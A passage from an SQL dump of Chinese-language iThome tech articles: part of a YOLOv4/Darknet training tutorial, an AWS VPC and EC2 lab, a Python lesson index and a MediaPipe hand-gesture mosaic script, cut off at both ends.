imread("123.jpg"); //讀取影像\n	if (img.empty())\n    {\n    	cout &lt;&lt; "請確認影像檔路徑正確" &lt;&lt; endl;\n    	return -1;\n    }\n	imshow("test", img); //印出圖片\n	waitKey(0);\n    system("pause");\n    return 0;\n}\n</code></pre>\n<ul>\n<li>\n<p>執行結果：選取Release與x64，點擊「本機Windows偵錯工具」，成功顯示影像。</p>\n<p><img src="https://i.imgur.com/USV8rYu.png" alt=""></p>\n</li>\n</ul>\n</li>\n</ul>\n<p>2.3 若執行後出現錯誤，解決方法如下。</p>\n<ul>\n<li>\n<p>找不到opencv_world454.lib：</p>\n<ul>\n<li>新增系統環境變數 <code>C:\Users\88691\Desktop\YOLOV4\opencv\build\x64\vc15\lib</code>\n</li>\n</ul>\n<p><img src="https://i.imgur.com/dNzWYW2.png" alt=""></p>\n</li>\n<li>\n<p>找不到opencv_world454.dll</p>\n<ul>\n<li>新增系統環境變數 <code>C:\Users\88691\Desktop\YOLOV4\opencv\build\x64\vc15\bin</code>\n</li>\n</ul>\n<p><img src="https://i.imgur.com/ZdzzXw7.png" alt=""></p>\n</li>\n</ul>\n</li>\n<li>\n<p>編譯Darknet</p>\n<p>3.1 將AlexeyAB/darknet下載的darknet-master.zip解壓縮。</p>\n<p><img src="https://i.imgur.com/s4l302c.png" alt=""></p>\n<p>3.2 開啟Cmake並設定路徑</p>\n<p><img src="https://i.imgur.com/YZckLoN.png" alt=""></p>\n<p>3.3 點擊ConFigure → 輸入x64 → 點擊finish</p>\n<p><img src="https://i.imgur.com/85SZQM3.png" alt=""></p>\n<p>3.4 若出現Looking for a CUDA compiler – NOTFOUND，解決方法如下。確認是否改善時，記得要重新開啟Cmake，Delete Cache後，再次點擊ConFigure → 輸入x64 → 點擊finish。</p>\n<ul>\n<li>\n<p>重新安裝：先安裝Visual Stutio再安裝CUDA</p>\n</li>\n<li>\n<p>到控制台 → 新增移除程式 → 查看是否有安裝到NVIDIA Tools Extension SDK(NVTX)</p>\n<p><img src="https://i.imgur.com/lrmRWvY.png" alt=""></p>\n</li>\n<li>\n<p>確認路徑中是否存在下列4個檔案，否則將路徑1的檔案複製到路徑2。</p>\n<ul>\n<li>\n<p>路徑1：<code>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.1\extras\visual_studio_integration\MSBuildExtensions</code></p>\n<p><img src="https://i.imgur.com/v418LHI.png" alt=""></p>\n</li>\n<li>\n<p>路徑2：<code>C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Microsoft\VC\v160\BuildCustomizations</code></p>\n<p><img src="https://i.imgur.com/I5wu42I.png" alt=""></p>\n</li>\n</ul>\n</li>\n<li>\n<p>嘗試安裝不同版本的CUDA</p>\n</li>\n</ul>\n<p>3.5 點擊Generate(產出新的Darknet.sln) → Open Project</p>\n<p><img src="https://i.imgur.com/wTpRVbC.png" alt=""></p>\n<p>3.6 生成解決方案：選取Release與x64，點擊建置 → 建置方案</p>\n<p><img src="https://i.imgur.com/MEgMrXD.png" alt=""></p>\n<p>3.7 若生成解決方案時，出現拒絕存取。</p>\n<ul>\n<li>\n<p>點擊方案總管 → 分別點擊滑鼠右鍵建置ALL_BUILD與INSTALL。</p>\n<p><img src="https://i.imgur.com/GfC2URR.png" alt=""></p>\n</li>\n</ul>\n<p>3.8 成功生成解方方案後，將 \build\darknet\Release5 中5個檔案複製到 \build\darknet\x64。</p>\n<p><img src="https://i.imgur.com/yS9HsNa.png" alt=""></p>\n</li>\n<li>\n<p>執行Darknet訓練模型</p>\n<p>4.1 事前準備</p>\n<ul>\n<li>\n<p>按此下載<a href="https://github.com/midnightla0710/Yolo_v4/blob/main/train.rar" target="_blank">train.rar</a>，並解壓縮成train資料夾。</p>\n</li>\n<li>\n<p>將資料集放進train下的\VOCdevkit\VOC2021\JPEGImages</p>\n<p><img src="https://i.imgur.com/KC0Y2AP.png" alt=""></p>\n</li>\n<li>\n<p>將LabelImg標記產生的XML檔，放進train底下\VOCdevkit\VOC2021\Annotations</p>\n<p><img src="https://i.imgur.com/qDb0wNS.png" alt=""></p>\n</li>\n<li>\n<p>將train資料夾移到<code>C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64</code></p>\n<p><img src="https://i.imgur.com/WSyJy18.png" alt=""></p>\n</li>\n</ul>\n<p>4.2 執行gen_train_val.py：分配訓練集與測試集。</p>\n<p><img src="https://i.imgur.com/Kk2aXds.png" alt=""></p>\n<p><img src="https://i.imgur.com/Ozyo2mI.png" alt=""></p>\n<p>4.3 執行voc_label.py：datasets預處理，標記Train/Test/Val資料集。</p>\n<p><img src="https://i.imgur.com/rJnhnzu.png" alt=""></p>\n<p><img src="https://i.imgur.com/ZhsiU1K.png" alt=""></p>\n<p>4.4 開啟obj.data，將路徑修改成絕對路徑。</p>\n<p><img src="https://i.imgur.com/B6sImou.png" alt=""></p>\n<p>4.5 開啟cmd視窗，輸入指令<code>cd C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64</code></p>\n<p><img src="https://i.imgur.com/mequ1qd.png" alt=""></p>\n<p>4.6 輸入指令<code>darknet detector train C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64\train\obj.data C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64\train\yolov4-tiny-myobj.cfg C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64\train\yolov4-tiny.conv.29 -map</code></p>\n<p><img src="https://i.imgur.com/zwpizDA.png" alt=""></p>\n<p>4.7 若執行時出現錯誤，解決方法如下。</p>\n<ul>\n<li>\n<p>找不到 pthreadVC2.dll：</p>\n<ul>\n<li>前往 <code>C:\Users\88691\Desktop\YOLOV4\darknet-master\3rdparty\pthreads\bin</code> 複製pthreadVC2.dll。</li>\n<li>複製到<code>C:\Windows\System32</code> 和<code>C:\Windows\System64</code>資料夾內。</li>\n</ul>\n<p><img src="https://i.imgur.com/jJb47D0.png" alt=""></p>\n</li>\n<li>\n<p>找不到 opencv_world454.dll</p>\n<ul>\n<li>前往<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\x64\vc15\bin</code>複製opencv_world454.dll</li>\n<li>複製到<code>C:\Users\88691\Desktop\YOLOV4\darknet-master\build\darknet\x64</code>資料夾</li>\n</ul>\n<p><img src="https://i.imgur.com/EUaVcI6.png" alt=""></p>\n</li>\n</ul>\n<p>4.8 YOLOV4模型訓練完成</p>\n<p><img src="https://i.imgur.com/FKhVne8.png" alt=""></p>\n<p>4.9 模型預測</p>\n<ul>\n<li>程式碼</li>\n</ul>\n<pre><code class="language-python">import cv2\nimport numpy as np\nimport os\nimport shutil\n\n#讀取模型與訓練權重\ndef initNet():\n    CONFIG = ''./train_finished_1/yolov4-tiny-myobj.cfg''\n    WEIGHT = ''./yolov4-tiny-myobj_last.weights''\n    # WEIGHT = ''./train_finished/yolov4-tiny-myobj_last.weights''\n    net = cv2.dnn.readNet(CONFIG, WEIGHT)\n    model = cv2.dnn_DetectionModel(net)\n    model.setInputParams(size=(416, 416), scale=1/255.0)\n    model.setInputSwapRB(True)\n    return model\n\n#物件偵測\ndef nnProcess(image, model):\n    classes, confs, boxes = model.detect(image, 0.4, 0.1)\n    return classes, confs, boxes\n\n#框選偵測到的物件，並裁減\ndef drawBox(image, classes, confs, boxes):\n    new_image = image.copy()\n    for (classid, conf, box) in zip(classes, confs, boxes):\n        x, y, w, h = box\n        if x - 18 &lt; 0:\n            x = 18\n        if y - 18 &lt; 0:\n            y = 18\n        cv2.rectangle(new_image, (x - 18, y - 18), (x + w + 20, y + h + 24), (0, 255, 0), 3)\n    return new_image\n\n# 裁減圖片\ndef cut_img(image, classes, confs, boxes):\n    cut_img_list = []\n    for (classid, conf, box) in zip(classes, confs, boxes):\n        x, y, w, h = box\n        if x - 18 &lt; 0:\n            x = 18\n        if y - 18 &lt; 0:\n            y = 18\n        cut_img = image[y - 18:y + h + 20, x - 18:x + w + 25]\n        cut_img_list.append(cut_img)\n    return cut_img_list[0]\n\n# 儲存已完成前處理之圖檔(中文路徑)\ndef saveClassify(image, output):\n    cv2.imencode(ext=''.jpg'', img=image)[1].tofile(output)\n\nif __name__ == ''__main__'':\n    source = ''./public_training_data/public_training_data/''\n    # source = ''./public_training_data/public_testing_data/''\n    files = os.listdir(source)\n    print(''※ 資料夾共有 {} 張圖檔''.format(len(files)))\n    print(''※ 開始執行YOLOV4物件偵測...'')\n    model = initNet()\n    success = fail = uptwo = 0\n    number = 1\n    for file in files:\n        print('' ▼ 第{}張''.format(number))\n        img = cv2.imdecode(np.fromfile(source+file, dtype=np.uint8), -1)\n        classes, confs, boxes = nnProcess(img, model)\n        if len(boxes) == 0:\n            # 儲存原始除檔照片\n            # saveClassify(img, ''./public_training_data/YOLOV4_pre/fail/'' + file)\n            # saveClassify(img, ''./test123/fail/'' + file)\n            fail += 1\n            print(''  字元偵測失敗：{}''.format(file))\n            # cv2.imshow(''img'', img)\n        elif len(boxes) &gt;= 2:\n            print(''  字元偵測超過2個'')\n            box_img = drawBox(img, classes, confs, boxes)\n            # saveClassify(box_img, ''./public_training_data/YOLOV4_pre/uptwo/'' + file)\n            # saveClassify(img, ''./test123/uptwo/'' + file)\n            # cv2.imshow(''img'', img)\n            uptwo += 1\n        else:\n            # 框選後圖檔\n            frame = drawBox(img, classes, confs, boxes)\n            # 裁剪後圖檔\n            cut = cut_img(img, classes, confs, boxes)\n            # 儲存裁剪後圖檔\n            # saveClassify(cut, ''./public_training_data/YOLOV4_pre/success/'' + file)\n            # saveClassify(img, ''./test123/success/'' + file)\n            success += 1\n            print(''  字元偵測成功：{}''.format(file))\n            # cv2.imshow(''img'', frame)\n            # cv2.imshow(''cut'', cut)\n        print(''='' * 60)\n        # cv2.waitKey()\n        number += 1\n    print(''※ 程式執行完畢'')\n    print(''※ 總計：成功 {} 張、失敗 {} 張''.format(success, fail))\n    print(''※ 偵測超過兩個字元組 {} 張''.format(uptwo))\n</code></pre>\n<ul>\n<li>執行結果(成功框選字串)</li>\n</ul>\n<p><img src="https://i.imgur.com/UyMC7iP.png" alt=""></p>\n</li>\n</ol>\n<hr>\n<h3>小結</h3>\n<p>久違了大家，原以為這篇寫到一半就會偷懶擱置，畢竟Debug已經夠累了。出乎意料地，回過神就寫完了。我想：參加鐵人賽的一個月，讓我養成了學習與撰文分享的好習慣。</p>\n<p>讓我們繼續看下去...</p>\n<hr>\n<h3>參考資料</h3>\n<ol>\n<li>\n<a href="https://jianjiesun.medium.com/opencv-visual-studio%E5%AE%89%E8%A3%9D%E6%95%99%E5%AD%B8-3f33baf37e5b" target="_blank">OpenCV Visual Studio安裝教學</a>\n</li>\n<li>\n<a href="https://iter01.com/583441.html" target="_blank">YOLOv4 win10 配置 + 訓練自己的資料 + 測試</a>\n</li>\n<li>\n<a href="https://wings890109.pixnet.net/blog/post/68926387-yolov4%E5%BB%BA%E7%BD%AE%E6%B5%81%E7%A8%8B" target="_blank">YOLOV4建置流程with within windows10 &amp; VS2019</a>\n</li>\n</ol>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'AI & Data',NULL,'2021-11-03 15:44:32');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10263177','Day 8 網路寶石：【Lab】VPC外網 Public Subnet to the Internet (IGW) (下)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','8',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg"></p>\n<p>今天我們繼續完成【Lab】VPC外網 的下半部實作！</p>\n<h4>建立 EC2 instance</h4>\n<p>在此單元，我們還不需要去深入瞭解 EC2，僅需創建出來協助我們學習 VPC 的部分，後面 EC2 章節會再深入與大家介紹。</p>\n<p>點擊上方的 Services（下圖#1），搜尋 EC2 選擇第一個（下圖#2），並將其從新分頁開啟（下圖#3）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DjvAB5i6dd.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DjvAB5i6dd.png"></p>\n<p>進入 Instances 介面後（下圖#1），點擊上方的 Launch Instance（下圖#2）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951THLNWyr1jr.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951THLNWyr1jr.png"></p>\n<h4>創造 EC2 instance 步驟</h4>\n<p>Step1: 選擇第一個 Linux AMI。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951snLHmd3HRV.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951snLHmd3HRV.png"></p>\n<p>Step2: 用預設的Instance Type 即可。</p>\n<p>Step3: 需進行以下設定：</p>\n<p>(1) Network 選擇剛剛建立的 vpc-001（下圖#1）</p>\n<p>(2) Subnet 也選擇剛剛建立的 public-subnet（下圖#2）</p>\n<p>(3) 需要 Public IP，故 Auto-assign Public IP 選擇 Enable（下圖#3），因為只有 Public IP 有設定出來，才能連進去此instance</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009518a9k4h4eqD.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009518a9k4h4eqD.png"></p>\n<p>Step4: Storage 預設即可。</p>\n<p>Step5: Tags 跳過。</p>\n<p>Step6: 可以看到已經有了一個 SSH（下圖#1），可以藉此允許 Security rule 進去，並允許任何來源都可以進去。</p>\n<p>點擊 Add Rule（下圖#2）加入新的東西 ICMP-IPv4（下圖#3），可以允許外界 ping 這台主機。在工作中，我們常用 ping 這個指令，來驗證遠端主機是否可給予回應，用以驗證兩端網路是否相通，所以這邊要允許任何來源請求都能 ping 這台主機（下圖#4）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951tIeTORqCvZ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951tIeTORqCvZ.png"></p>\n<p>Step7: 直接按Launch。</p>\n<p>接下來需要創建新的 key pair（下圖#1），取名為 vpc-ec2–002（下圖#2），並下載下來（下圖#3#4），等下必須用此 .pem file 進行身份驗證，再按下 Launch Instances（下圖#5）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gYv4Vf54fz.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gYv4Vf54fz.png"></p>\n<p>Instance 成功啟動後，Instance State 會顯示 running（下圖#1），反之若還在啟動過程中則會顯示為 pending。</p>\n<p>將此 Instance 重新命名 public-ec2（下圖#2）。</p>\n<p>Subnet ID 顯示的是剛剛建立的 Public subnet（下圖#3），所以此 EC2 在該 Public subnet。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951sQwHn7hADw.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951sQwHn7hADw.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009514QyBzmnAB0.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009514QyBzmnAB0.png"></p>\n<h4>驗證是否可以連到 EC2</h4>\n<p>在本地電腦開啟 Terminal 後，輸入 ping 及此 Instance 的 Public IP，即可成功連上此 EC2，並得到回應。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009511ZRaMov8vm.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009511ZRaMov8vm.png"></p>\n<h4>利用 SSH 連進此 Instance</h4>\n<p>點擊 Connect（下圖#1），會出現該做什麼事情才能連進去的提示（下圖#2）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951nO5yBOCAxd.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951nO5yBOCAxd.png"></p>\n<p>連線的步驟</p>\n<p>(1) 將目錄切換到儲存 .pem 檔的目錄位置<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009510pbkfBrzKI.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009510pbkfBrzKI.png"></p>\n<p>(2) 輸入ls -l | grep vpc-ec2–002（下圖#1），可以看到確實存在該 .pem file（下圖#2）<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951bGEEFxkXCU.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951bGEEFxkXCU.png"></p>\n<p>(3) 該 .pem file 權限規則有 -rw，亦即 write、寫入的權限，AWS 覺得太危險，故使用前要求我們須先修改。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951SfySFj1Inc.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951SfySFj1Inc.png"></p>\n<p>(4) 輸入提示的指令 chmod 400 vpc-ec2-002.pem，將權限改得小一點<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951P6vntz5mlW.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951P6vntz5mlW.png"></p>\n<p>(5) 重複第二步再次確認權限，可以發現 w 不見了，亦即只剩讀取的功能<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951efRHvLgicW.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951efRHvLgicW.png"></p>\n<p>(6) 輸入提示的指令連過去，使用的帳號是 ec2-user，目的地則是該 Instance 的 Public IP<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951fh8s6Siech.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951fh8s6Siech.png"></p>\n<p>(7) 第一次連線會被詢問是否要將 host name 存起來，打上 yes<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951oDcDUy0wwA.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951oDcDUy0wwA.png"></p>\n<p>(8) 好了後會出現此頁面，並告知目前是 ec2-user，IP 為該 Instance 的Private IP<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951hN9ilJdn1o.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951hN9ilJdn1o.png"></p>\n<p>(9) 為了測試此 EC2 是否能連去外網再連回來，輸入 ping 8.8.8.8，此為 Google DNS Server 的位置，非常有公信力，如果有網路的話，應該要能連到<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951JNrh47k7L4.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951JNrh47k7L4.png"></p>\n<p>(10) 最後可以看到成功得到回應，也就驗證了此 EC2 instance 也能連到外面的 Internet<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951qnki2FvHAJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951qnki2FvHAJ.png"></p>\n<h4>小結</h4>\n<p>本單元，我們進行了對 Public Subnet 的實作示範，了解 VPC、Subnet 的設定方式。其中最重要的，為設定 Route Table，將所有通往 Internet 的請求導向 IGW (Internet Gateway) ，並透過 IGW 與 Internet 交流。</p>\n<h4>What''s Next?</h4>\n<p>其實 VPC 還有許多 Lab 可以讓大家多動手練習，比如說 Private Subnet &amp; NAT、SG &amp; NACL 設置等，但在 30 天中每個服務大約只能分到 5 天，所以明天我們將直接開箱第二個「運算寶石：EC2」!</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-13 08:18:32');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259086','每個人都該學的30個Python技巧｜技巧 1：快樂學Python，必學的編輯器 — Spyder 及 Colab (字幕、襯樂)','大學生必學的 30個Python技巧','1',replace('\n                        <div class="markdown__style">\n                                                            <p>哈囉～這是霓霓第一次參加鐵人賽，為了這一天，我準備了兩個月，為初學者準備的四個學習配方，包含：30個不可不學的Python入門語法技巧、每個知識點所需的隨堂練習與講解（約150題）、幫助理解內容的字幕、提升專注度的學習音樂襯底。一切的努力都是要讓你都可以透過教學短片，輕鬆學會Python入門並且跟我一起快樂的往前走。</p>\n<ul>\n<li>技巧 1：<a href="https://ithelp.ithome.com.tw/articles/10259086" target="_blank">環境介紹—Spyder及Colab</a>\n</li>\n<li>技巧 2：<a href="https://ithelp.ithome.com.tw/articles/10259512" target="_blank">基本功—數字與字串</a>\n</li>\n<li>技巧 3：<a href="https://ithelp.ithome.com.tw/articles/10259578" target="_blank">與電腦溝通的方法—input()與print()</a>\n</li>\n<li>技巧 4：<a href="https://ithelp.ithome.com.tw/articles/10259848" target="_blank">字串格式化</a>\n</li>\n<li>技巧 5：<a href="https://ithelp.ithome.com.tw/articles/10260004" target="_blank">各種運算子(上)</a>\n</li>\n<li>技巧 6：<a href="https://ithelp.ithome.com.tw/articles/10260488" target="_blank">各種運算子(下)</a>\n</li>\n<li>技巧 7：<a href="https://ithelp.ithome.com.tw/articles/10260609" target="_blank">能精準判斷的判斷式</a>\n</li>\n<li>技巧 8：<a href="https://ithelp.ithome.com.tw/articles/10261215" target="_blank">進階判斷—巢狀判斷式</a>\n</li>\n<li>技巧 9：<a href="https://ithelp.ithome.com.tw/articles/10261611" target="_blank">快速建立數列—range函式</a>\n</li>\n<li>技巧 10：<a href="https://ithelp.ithome.com.tw/articles/10261676" target="_blank">迴圈二部曲—for迴圈</a>\n</li>\n<li>技巧 11：<a href="https://ithelp.ithome.com.tw/articles/10262025" target="_blank">迴圈二部曲—while迴圈</a>\n</li>\n<li>技巧 12：<a href="https://ithelp.ithome.com.tw/articles/10262657" target="_blank">終止迴圈咒語—break及continue</a>\n</li>\n<li>技巧 13：<a href="https://ithelp.ithome.com.tw/articles/10263015" target="_blank">什麼都能裝的百寶袋—串列(List)(上)</a>\n</li>\n<li>技巧 14：<a href="https://ithelp.ithome.com.tw/articles/10263139" target="_blank">什麼都能裝的百寶袋—串列(List)(下)</a>\n</li>\n<li>技巧 15：<a href="https://ithelp.ithome.com.tw/articles/10263143" target="_blank">新增或刪除串列元素</a>\n</li>\n<li>技巧 16：<a href="https://ithelp.ithome.com.tw/articles/10263144" target="_blank">其他串列常用的函式</a>\n</li>\n<li>技巧 17：<a href="https://ithelp.ithome.com.tw/articles/10263145" target="_blank">Python容器—元組(Tuple)</a>\n</li>\n<li>技巧 18：<a href="https://ithelp.ithome.com.tw/articles/10263148" target="_blank">Python容器—字典(dictionary)</a>\n</li>\n<li>技巧 19：<a href="https://ithelp.ithome.com.tw/articles/10264871" target="_blank">字典進階操作</a>\n</li>\n<li>技巧 20：<a href="https://ithelp.ithome.com.tw/articles/10264872" target="_blank">Python容器—集合(set)</a>\n</li>\n<li>技巧 21：<a href="https://ithelp.ithome.com.tw/articles/10264873" target="_blank">set的處理方法</a>\n</li>\n<li>技巧 22：<a href="https://ithelp.ithome.com.tw/articles/10264874" target="_blank">想怎麼設就怎麼設的自訂函式</a>\n</li>\n<li>技巧 23：<a href="https://ithelp.ithome.com.tw/articles/10264875" target="_blank">方便的運算函式—pow()、divmod()、round()</a>\n</li>\n<li>技巧 24：<a href="https://ithelp.ithome.com.tw/articles/10264876" target="_blank">超便利的內建函式—max()、min()、sum()</a>\n</li>\n<li>技巧 25：<a href="https://ithelp.ithome.com.tw/articles/10264877" target="_blank">分割或是連接字串—split()及join()</a>\n</li>\n<li>技巧 26：<a href="https://ithelp.ithome.com.tw/articles/10269750" target="_blank">搜尋以及取代—find()和replace()</a>\n</li>\n<li>技巧 27：<a href="https://ithelp.ithome.com.tw/articles/10269749" target="_blank">常用的字串函式統整</a>\n</li>\n<li>技巧 28：<a href="https://ithelp.ithome.com.tw/articles/10269751" target="_blank">想像力就是超能力，快試著自己創造模組</a>\n</li>\n<li>技巧 29：<a href="https://ithelp.ithome.com.tw/articles/10269752" target="_blank">Python內建模組—random</a>\n</li>\n<li>技巧 30：<a href="https://ithelp.ithome.com.tw/articles/10269753" target="_blank">檔案操作</a>\n</li>\n</ul>\n<p>接下來就開始第一個技巧吧，第一個技巧當然就是要先認識寫程式的地方，在這系列中會帶你認識兩種不同的編輯器。<br>\n第一個要認識的是Spyder，它是內建在Anaconda裡面的（也可以單獨裝但比較不建議），影片中會帶著你一步一步安裝。第二種是Colab，這可是Google免費提供的呦，想知道怎麼用嗎？那快點開影片看看怎麼安裝這兩種編輯器吧～</p>\n<p><iframe width="560" height="315" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen" src="https://www.youtube.com/embed/-CQGFHn01hY"></iframe></p>\n<hr>\n<p><strong>附註：特別感謝桃園育達高中的栽培，讓我帶著母校的榮譽向前走。</strong></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'影片教學',NULL,'2021-09-01 18:13:37');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10265041','[Day17] 不可以比中指! 用Python做一個AI有禮貌神器!','奇怪的知識增加了!原來程式還可以這樣用?!','17',replace('\n                        <div class="markdown__style">\n                                                            <p>比中指是一個相當不禮貌的行為，但有時候太生氣還是會不小心比出來對吧?<br>\n既然無論如何都會比中指的話，那就把中指加上馬賽克吧! (這什麼結論)</p>\n<p><strong>開發環境</strong></p>\n<ul>\n<li>\n<a href="https://www.python.org/downloads/" target="_blank">Python</a>\n</li>\n<li>\n<a href="https://mediapipe.dev/" target="_blank">MediaPipe</a> (偵測手指)</li>\n<li>\n<a href="https://opencv.org/" target="_blank">OpenCV</a> (馬賽克製作)</li>\n<li>\n<a href="https://codechina.csdn.net/EricLee/handpose_x/-/issues/3" target="_blank">手指向量夾角參考文件</a> (因為我懶得算，所以計算夾角的部分用人家算好的)</li>\n</ul>\n<p><strong>MediaPipe介紹</strong></p>\n<p>MediaPipe是Google Research開發的多媒體機器學習模型應用框架，可支援JavaScript、Python、C++等語言。可以直接使用API實現3D手部標誌追蹤、BlazeFace 人臉檢測、物體檢測等功能。<br>\n本篇以3D手部標誌追蹤實現偵測中指的功能，下圖為21個手部3D座標:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20133286qPbqfwnsuG.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20133286qPbqfwnsuG.png"></p>\n<p><strong>程式碼</strong></p>\n<pre><code>import cv2\nimport mediapipe as mp\nimport math\n\n# 針對給定的某個矩形做馬賽克\ndef mosaic(img, left_up, right_down):\n    new_img = img.copy()\n    # size代表此馬賽克區塊中每塊小區域的邊長\n    size = 10\n    for i in range(left_up[1], right_down[1]-size-1, size):\n        for j in range(left_up[0], right_down[0]-size-1, size):\n            try:\n                # 將此小區域中的每個像素都給定為最左上方的像素值\n                new_img[i:i + size, j:j + size] = img[i, j, :]\n            except:\n                pass\n    return new_img\n\ndef vector_2d_angle(v1,v2): # 求出v1,v2兩條向量的夾角\n    v1_x=v1[0]\n    v1_y=v1[1]\n    v2_x=v2[0]\n    v2_y=v2[1]\n    try:\n        angle_= math.degrees(math.acos((v1_x*v2_x+v1_y*v2_y)/(((v1_x**2+v1_y**2)**0.5)*((v2_x**2+v2_y**2)**0.5))))\n    except:\n        angle_ = 100000.\n    return angle_\n\ndef hand_angle(hand_):\n    angle_list = []\n    #---------------------------- thumb 大拇指角度\n    angle_ = vector_2d_angle(\n        ((int(hand_[0][0])- int(hand_[2][0])),(int(hand_[0][1])-int(hand_[2][1]))),\n        ((int(hand_[3][0])- int(hand_[4][0])),(int(hand_[3][1])- int(hand_[4][1])))\n        )\n    angle_list.append(angle_)\n    #---------------------------- index 食指角度\n    angle_ = vector_2d_angle(\n        ((int(hand_[0][0])-int(hand_[6][0])),(int(hand_[0][1])- int(hand_[6][1]))),\n        ((int(hand_[7][0])- int(hand_[8][0])),(int(hand_[7][1])- int(hand_[8][1])))\n        )\n    angle_list.append(angle_)\n    #---------------------------- middle 中指角度\n    angle_ = vector_2d_angle(\n        ((int(hand_[0][0])- int(hand_[10][0])),(int(hand_[0][1])- int(hand_[10][1]))),\n        ((int(hand_[11][0])- int(hand_[12][0])),(int(hand_[11][1])- int(hand_[12][1])))\n        )\n    angle_list.append(angle_)\n    #---------------------------- ring 無名指角度\n    angle_ = vector_2d_angle(\n        ((int(hand_[0][0])- int(hand_[14][0])),(int(hand_[0][1])- int(hand_[14][1]))),\n        ((int(hand_[15][0])- int(hand_[16][0])),(int(hand_[15][1])- int(hand_[16][1])))\n        )\n    angle_list.append(angle_)\n    #---------------------------- pink 小拇指角度\n    angle_ = vector_2d_angle(\n        ((int(hand_[0][0])- int(hand_[18][0])),(int(hand_[0][1])- int(hand_[18][1]))),\n        ((int(hand_[19][0])- int(hand_[20][0])),(int(hand_[19][1])- int(hand_[20][1])))\n        )\n    angle_list.append(angle_)\n    return angle_list\n\ndef hand_gesture(angle_list):\n    gesture_str = None\n    if 100000. not in angle_list:\n        if (angle_list[1]&gt;40) and (angle_list[2]&lt;40) and (angle_list[3]&gt;40) and (angle_list[4]&gt;40):\n            gesture_str = "middle"\n    return gesture_str\n\ndef detect():\n    mp_hands = mp.solutions.hands\n    hands = mp_hands.Hands(\n            static_image_mode=False,\n            max_num_hands=1,\n            min_detection_confidence=0.75,\n            min_tracking_confidence=0.75)\n    # 開啟視訊鏡頭讀取器\n    cap = cv2.VideoCapture(0)\n    while True:\n        # 偵測影像中的手部\n        _, frame = cap.read()\n        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\n        frame= cv2.flip(frame,1)\n        results = hands.process(frame)\n        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)\n\n        if results.multi_hand_landmarks:\n            for hand_landmarks in results.multi_hand_landmarks:\n                keypoint_pos = []\n                for i in range(21):\n                    x = hand_landmarks.landmark[i].x*frame.shape[1]\n                    y = hand_landmarks.landmark[i].y*frame.shape[0]\n                    keypoint_pos.append((x,y))\n                if keypoint_pos:\n                    # 得到各手指的夾角資訊\n                    angle_list = 